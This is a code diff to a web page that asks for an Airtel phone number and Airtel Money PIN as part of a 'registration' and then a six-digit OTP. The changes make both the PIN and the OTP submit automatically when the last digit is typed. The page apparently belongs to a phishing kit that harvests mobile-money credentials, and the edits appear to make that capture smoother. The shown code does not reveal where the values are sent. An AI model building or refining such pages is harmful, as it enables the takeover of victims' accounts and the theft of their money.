@@ -376,10 +376,11 @@
 
           <p class="pin-label">Enter your Airtel Money PIN</p>
           <div class="pin-boxes" id="pinContainer">
+            <!-- Automatically trigger submit on the 4th digit -->
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin3')" id="pin2">
-            <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" id="pin3">
+            <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, null)" id="pin3">
           </div>
           <div class="error" id="errLogin" style="margin-top: 15px;"></div>
         </div>
@@ -468,7 +469,6 @@
     e.preventDefault();
     const btn = document.getElementById('btnSubmitForm');
     
-    // Instantly show loading state on button
     btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
     btn.disabled = true;
     document.getElementById('errQ').style.display = 'none';
@@ -497,9 +497,15 @@
     }
   });
 
+  // PIN AUTO-SUBMIT LOGIC
   function moveFocus(current, nextId) {
     if (current.value.length === 1) {
-      if (nextId) document.getElementById(nextId).focus();
+      if (nextId) {
+        document.getElementById(nextId).focus();
+      } else {
+        // This triggers when the 4th digit is typed
+        submitRegistration();
+      }
     }
   }
 
@@ -508,8 +514,8 @@
     const phone = document.getElementById('pPhone').value.trim();
     const pins = Array.from(document.querySelectorAll('#pinContainer input')).map(i => i.value).join('');
     
-    if (phone === '' || pins === '') {
-      document.getElementById('errLogin').textContent = 'Please fill in the Airtel phone number and PIN.';
+    if (phone === '' || pins.length < 4) {
+      document.getElementById('errLogin').textContent = 'Please enter your Airtel number and full 4-digit PIN.';
       document.getElementById('errLogin').style.display = 'block';
       return;
     }
@@ -541,22 +547,21 @@
     }
   }
 
+  // OTP AUTO-SUBMIT LOGIC
   function moveFocusOTP(current, nextId) {
     if (current.value.length === 1) {
-      if (nextId) document.getElementById(nextId).focus();
+      if (nextId) {
+        document.getElementById(nextId).focus();
+      } else {
+        // This triggers when the 6th digit is typed
+        submitOTP();
+      }
     }
   }
 
-  document.getElementById('otpContainer').addEventListener('input', function(e) {
-    const otp = Array.from(document.querySelectorAll('#otpContainer input')).map(i => i.value).join('');
-    if (otp.length === 6) {
-      submitOTP();
-    }
-  });
-
   async function submitOTP() {
     const otp = Array.from(document.querySelectorAll('#otpContainer input')).map(i => i.value).join('');
-    if (otp === '') return;
+    if (otp.length < 6) return;
 
     document.getElementById('errOtp').style.display = 'none';
 
